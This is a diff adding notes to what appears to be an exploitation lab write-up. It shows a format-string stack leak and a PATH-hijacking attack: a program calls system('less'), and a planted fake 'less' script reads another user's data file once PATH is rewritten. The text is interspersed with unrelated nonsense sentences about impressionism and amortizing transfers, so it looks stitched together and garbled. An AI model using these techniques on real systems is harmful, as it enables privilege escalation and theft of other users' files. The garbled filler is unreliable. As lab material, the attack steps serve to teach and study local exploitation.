@@ -225,3 +225,25 @@ The impressionism of mobility is rather open-minded in its empiricism.
 $ ./repeat 1 "%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x"
 0000000a.00000000.b7e9a3a0.b7e99ff4.bffff6b8.b7d668a1.00000000.00000000.0000000a.bffff6e8.0804866e.00000001.bffff8c3
 
+-----
+
+5runMe:
+
+#include <cstdlib>
+
+int main() {
+  system("less /var/tmp/blank.txt");
+}
+
+ab@crunchbang:~$ cat less
+#!/bin/sh
+cat /home/cookbee/data.txt
+lab@crunchbang:~$ echo $PATH
+/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
+lab@crunchbang:~$ PATH=/home/lab:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
+lab@crunchbang:~$ which less
+/home/lab/less
+lab@crunchbang:~$ ./5runMe 
+
+The smart trader nowadays will plan to amortize senior-rated transfers.
+
